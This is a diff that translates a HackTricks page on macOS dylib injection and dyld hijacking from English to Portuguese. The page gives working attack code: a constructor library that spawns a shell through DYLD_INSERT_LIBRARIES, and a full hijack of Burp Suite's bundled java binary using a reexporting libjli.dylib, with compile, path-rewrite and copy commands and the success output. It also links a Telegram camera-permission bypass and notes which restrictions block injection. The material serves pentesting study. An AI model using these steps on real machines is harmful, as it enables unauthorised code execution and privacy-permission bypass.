@@ -1,21 +1,20 @@
-# macOS Dyld Hijacking & DYLD\_INSERT\_LIBRARIES
+## Hijacking DYLD e DYLD\_INSERT\_LIBRARIES no macOS
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## DYLD\_INSERT\_LIBRARIES Basic example
+## Exemplo básico de DYLD\_INSERT\_LIBRARIES
 
-**Library to inject** to execute a shell:
-
+**Biblioteca para injetar** e executar um shell:
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -31,9 +30,7 @@ void myconstructor(int argc, const char **argv)
     execv("/bin/bash", 0);
 }
 ```
-
-Binary to attack:
-
+Binário para ataque:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -44,16 +41,13 @@ int main()
     return 0;
 }
 ```
-
-Injection:
-
+Injeção:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
+## Exemplo de Dyld Hijacking
 
-## Dyld Hijacking Example
-
-The targeted vulenrable binary is `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java`.
+O binário vulnerável alvo é `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/java`.
 
 {% tabs %}
 {% tab title="LC_RPATH" %}
@@ -72,7 +66,7 @@ otool -l "/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundl
 {% endcode %}
 {% endtab %}
 
-{% tab title="@rpath" %}
+{% tab title="@loader_path" %}
 {% code overflow="wrap" %}
 ```bash
 # Check librareis loaded using @rapth and the used versions
@@ -92,13 +86,12 @@ compatibility version 1.0.0
 {% endtab %}
 {% endtabs %}
 
-With the previous info we know that it's **not checking the signature of the loaded libraries** and it's **trying to load a library from**:
+Com as informações anteriores, sabemos que ele **não está verificando a assinatura das bibliotecas carregadas** e está **tentando carregar uma biblioteca de**:
 
 * `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`
 * `/Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/bin/libjli.dylib`
 
-However, the first one doesn't exist:
-
+No entanto, o primeiro não existe:
 ```bash
 pwd
 /Applications/Burp Suite Professional.app
@@ -107,8 +100,7 @@ find ./ -name libjli.dylib
 ./Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib
 ./Contents/Resources/jre.bundle/Contents/MacOS/libjli.dylib
 ```
-
-So, it's possible to hijack it! Create a library that **executes some arbitrary code and exports the same functionalities** as the legit library by reexporting it. And remember to compile it with the expected versions:
+Então, é possível sequestrá-lo! Crie uma biblioteca que execute algum código arbitrário e exporte as mesmas funcionalidades que a biblioteca legítima, reexportando-a. E lembre-se de compilá-la com as versões esperadas:
 
 {% code title="libjli.m" %}
 ```objectivec
@@ -121,7 +113,7 @@ void custom(int argc, const char **argv) {
 ```
 {% endcode %}
 
-Compile it:
+Compile-o:
 
 {% code overflow="wrap" %}
 ```bash
@@ -130,7 +122,7 @@ gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Found
 ```
 {% endcode %}
 
-The reexport path created in the library is relative to the loader, lets change it for an absolute path to the library to export:
+O caminho de reexportação criado na biblioteca é relativo ao carregador, vamos mudá-lo para um caminho absoluto para a biblioteca a ser exportada:
 
 {% code overflow="wrap" %}
 ```bash
@@ -151,7 +143,7 @@ otool -l libjli.dylib| grep REEXPORT -A 2
 ```
 {% endcode %}
 
-Finally just copy it to the **hijacked location**:
+Finalmente, basta copiá-lo para o **local sequestrado**:
 
 {% code overflow="wrap" %}
 ```bash
@@ -159,7 +151,7 @@ cp libjli.dylib "/Applications/Burp Suite Professional.app/Contents/Resources/jr
 ```
 {% endcode %}
 
-And **execute** the binary and check the **library was loaded**:
+E **execute** o binário e verifique se a **biblioteca foi carregada**:
 
 <pre class="language-context"><code class="lang-context">./java
 <strong>2023-05-15 15:20:36.677 java[78809:21797902] [+] dylib hijacked in ./java
@@ -168,21 +160,18 @@ And **execute** the binary and check the **library was loaded**:
 </code></pre>
 
 {% hint style="info" %}
-A nice writeup about how to abuse this vulnerability to abuse the camera permissions of telegram can be found in [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+Um bom artigo sobre como explorar essa vulnerabilidade para abusar das permissões da câmera do Telegram pode ser encontrado em [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 {% endhint %}
 
-## Bigger Scale
+## Escala Maior
 
-If you are planing on trying to inject libraries in unexpected binaries you could check the event messages to find out when the library is loaded inside a process (in this case remove the printf and the `/bin/bash` execution).
-
+Se você planeja tentar injetar bibliotecas em binários inesperados, pode verificar as mensagens de evento para descobrir quando a biblioteca é carregada dentro de um processo (neste caso, remova o printf e a execução `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
+## Verificar restrições
 
-## Check restrictions
-
-### SUID & SGID
-
+### SUID e SGID
 ```bash
 # Make it owned by root and suid
 sudo chown root hello
@@ -193,17 +182,14 @@ DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 # Remove suid
 sudo chmod -s hello
 ```
-
-### Section `__RESTRICT` with segment `__restrict`
-
+### Seção `__RESTRICT` com segmento `__restrict`
 ```bash
 gcc -sectcreate __RESTRICT __restrict /dev/null hello.c -o hello-restrict
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello-restrict
 ```
+### Tempo de execução endurecido
 
-### Hardened runtime
-
-Create a new certificate in the Keychain and use it to sign the binary:
+Crie um novo certificado no Keychain e use-o para assinar o binário:
 
 {% code overflow="wrap" %}
 ```bash
@@ -222,10 +208,10 @@ DYLD_INSERT_LIBRARIES=example.dylib ./hello-signed #Throw an error because an Ap
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
